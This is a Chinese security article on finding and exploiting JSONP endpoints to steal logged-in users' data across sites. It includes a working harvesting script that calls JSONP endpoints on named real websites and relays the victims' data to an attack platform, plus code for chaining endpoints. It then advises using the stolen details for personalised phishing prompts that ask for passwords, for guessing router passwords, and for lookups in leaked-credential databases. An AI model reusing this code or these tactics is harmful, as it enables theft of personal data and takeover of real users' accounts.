# JSONP挖掘与高级利用

**本文仅提供给爱好者学习交流，切勿用于其他`非法用途`**

0x00 参考资料
=========

* * *

1.  [利用JSONP进行水坑攻击 - 乌云知识库](http://drops.wooyun.org/papers/6612)
2.  [JSONP 安全攻防技术 - 知道创宇](http://blog.knownsec.com/2015/03/jsonp_security_technic/)

0x01 漏洞之我见
==========

* * *

> 这里不多说JSONP的介绍等，大家都懂。

这里，我站在程序员的角度去解释JSONP的正常使用。  
首先，定义一个用于接收数据的回调函数，比如：

```
function myData(data) {
    console.log('[!] DATA: ', data);
}

```

然后呢，我们就采用`<script>`标签去跨域获取数据：

```
<script src="http://root.cool/userinfo?fn=myData"></script>

```

当获取完如上url的内容后，会自动解释成`js`代码执行。由此来看，以上url访问输出的结果类似如下：

```
myData([{nickname: 'ANT', weibo: 'http://weibo.com/antoor'}])

```

其实就是执行了我们刚刚定义的`myData`函数并把需要的数据当作参数传入了进去而已。  
这样，我们就能理所当然地在`myData`函数中就获取到了我们所需要的数据。

**然后，我们站在攻击者的角度去想，如何最大化利用这个给程序员带来的方便的同时所带来的`安全隐患`？**

0x02 测试与构思
==========

* * *

这个漏洞和`xss`结合是非常完美的一种攻击手段，而这个功能，在蚁逅平台中的`蚁弹超人`早已经很容易地得到实现。 我们还是和程序员一样，先定义一个用来接收数据的函数，然后把我们挖掘到的`JSONP`接口进行逐个测试获取信息并返回，这样，就达到了我们获取目标信息的手段。  
用蚁弹超人中的`JSONP探测`插件的服务端代码来解释（已经去掉一些不好的接口）：

```
(function(API, AUTOSTART) {
    var JSONP = {
        hooks: [{
            name: '人人网1',
            link: 'http://base.yx.renren.com/RestAPI?method=api.base.getLoginUser&format=2&callback='
        }, {
            name: '人人网2',
            link: 'http://passport.game.renren.com/user/info?callback='
        }, {
            name: '网易163',
            link: 'http://comment.money.163.com/reply/check.jsp?time=1367240961474&callback='
        }, {
            name: '天涯论坛1',
            link: 'http://passport.tianya.cn/online/checkuseronline.jsp?callback='
        }, {
            name: '当当网',
            link: 'http://message.dangdang.com/api/msg_detail.php?customer_id=o4P00TweebicwjhS72NWew%3D%3D&data_type=jsonp&pageindex=1&module=1&pagesize=10&_=1416721945308&callback='
        }],
        start: function() {
            var self = this,
                inter = setInterval(function() {
                    if (!self.hooks[0]) {
                        clearInterval(inter);
                        return self.end();
                    }
                    self.get(self.hooks[0].link, self.hooks[0].name);
                    self.hooks.shift();
                }, 1000);
        },
        get: function(link, name, fn) {
            var hash = 'bomb' + String(new Date().getTime());
            window[hash] = function(data) {
                var _data = typeof(data) === 'object' ? JSON.stringify(data) : String(data);
                API.ss('### ' + name + '\n```\n' + _data + '\n```\n');
            };
            API.loadJS(link + hash);
        },
        end: function() {
            API.send('end');
        }
    };
    API.listen(function(act) {
        if (act === 'start') {
            JSONP.start();
        }
    });
    AUTOSTART ? JSONP.start() : null;
})

```

这段代码是很容易理解的，我们首先定义一个`JSONP接口`列表，然后通过`start`方法进行逐个接口的访问以及数据获取，最后直接进行数据返回以及保存，就这么简单。

0x03 漏洞挖掘
=========

* * *

一个好的工具是需要很多资源的支撑。

说了这么多，那我们如何去挖掘`JSONP接口`呢？

### 1. 手动挖掘

手动挖掘有利于深入学习原理以及发挥更多的不可能。

这里我采用`chrome浏览器`的调试窗口进行挖掘`weibo.com`中存在的漏洞。

首先把`Preserve log`选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。

![](http://drops.javaweb.org/uploads/images/12cef659ed622d2fa593584fe968280b7f78eb36.jpg)

然后，我们就可以在地址栏输入`weibo.com`，进行登录，然后在页面中随便点击链接了，这样做是为了收集更多的URL，你懂的！

感觉差不多了的时候，我们`Ctrl+F`进行搜索筛选，搜索关键字是一个绝活，你可以站在程序员的角度去想，写这个接口的规范一般是在服务端接收`callback`参数。  
所以我们可以搜索`callback`关键字：

![](http://drops.javaweb.org/uploads/images/d49d40f05c72233b688a03375101fb718c15d6ed.jpg)

站在攻击者的角度去想，还可以搜索`.json`关键字，或者其他你觉得可能出现问题的任何字符：

![](http://drops.javaweb.org/uploads/images/dd6accef87af3619747b027b2ebf11acdb05740b.jpg)

### 2. 搜索挖掘

上面的挖掘方法有点蠢，不过也是获取最准确以及最新数据的最有效方法。如果你是个懒人，那么搜索挖掘可能更适合。

根据上面的关键字，我们直接带入搜索引擎：

![](http://drops.javaweb.org/uploads/images/bcb0c10864ac2bb1d8a2ecec978a08fbd391f340.jpg)

### 3. 工具挖掘

> 如果搜索引擎无法提供最新的数据，你又不想手动一个个傻乎乎地去挖掘，那么，用你熟悉的脚本快速的编写一个工具也是极好的。

这里就不多说如何编写了，只提供一下思路：

1.  用脚本爬取目标站点收集`url`以及`headers`等信息
2.  通过`url`中是否存在`callback`等关键字以及`headers`中的`Content-Type`进行模糊过滤
3.  对模糊判断过滤的结果内容进行更准确地判断，比如判断内容中是否含有`callback`参数关键字以及模拟沙盒执行等等

0x04 漏洞高级利用
===========

* * *

**那么，你觉得`JSONP`仅仅是用来获取用户信息的吗？**

### 1. 定位钓鱼

> 通过`JSONP`获取的数据来判断当前个人的信息，如邮箱、博客、微博等再进行针对性地钓鱼。

这样，你可以利用获取到的信息降低被攻击者的防范意识。  
比如你弹框`请输入您的登录密码`可能会让用户产生怀疑，但是你要是这么写：`亲爱的YD，请输入您的登录密码`，那成功率会不会更大了呢？

### 2. 二次结合

在对一个购物网站进行挖掘的过程中，发现有的接口必须先知道用户的信息才能进一步获取我们需要的数据，那么，就得采用二次结合的方法来进行利用了。  
假设，我们挖掘到了两个`jsonp`接口：

```
1. http://root.cool/userinfo?callback=test
2. http://root.cool/usercoin?nickname=ANT&callback=xxxx

```

而我们要获取的是第二个接口的数据，但是第二个接口必须知道`nickname`参数，而`nickname`参数可以在第一个接口中获取，那好办：

```
function fn1(data) {
    API.loadJS('http://root.cool/usercoin?nickname=' + data.nickname + '&callback=fn2');
}
function fn2(data) {
    console.log('[!] 用户余额为：', data);
}
API.loadJS('http://root.cool/userinfo?callback=fn1');

```

很好理解吧！

### 3. 密码猜解攻击

这个比较好玩，假设我们需要利用xss攻破目标的路由，但是弱口令尝试失败，那么，我们就可以通过获取到的`JSONP`数据信息进行密码的组合、搜索。  
比如获取到微博`antoor`，那可以组合出`antoor123`、`antoor123456`等密码，也可以通过获取到的邮箱、QQ等进行在线"数据泄漏查询"接口进行密码查询返回，然后下一步你懂的！

这里说一下数据泄漏查询，也就是"社工库"的接口设计，我们要进行跨域查询，可以选择`JSONP`的方式，也可以通过设置`headers`中的`Access-Control-Allow-Origin`为`*`进行跨域允许。

给个PHP代码例子（摘自蚁逅`PHP运行环境`脚本）：

```
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: X-Requested-With,X_Requested_With');

```

0x05 后记杂语
=========

* * *

最近看到关于`JSONP`攻击的方法又火了起来，趁着兴头把自己的一点见解分享给大家。  
有不好，请指导，有技巧，欢迎探讨！

> 联系我：微博@[蚁逅](http://weibo.com/antoor)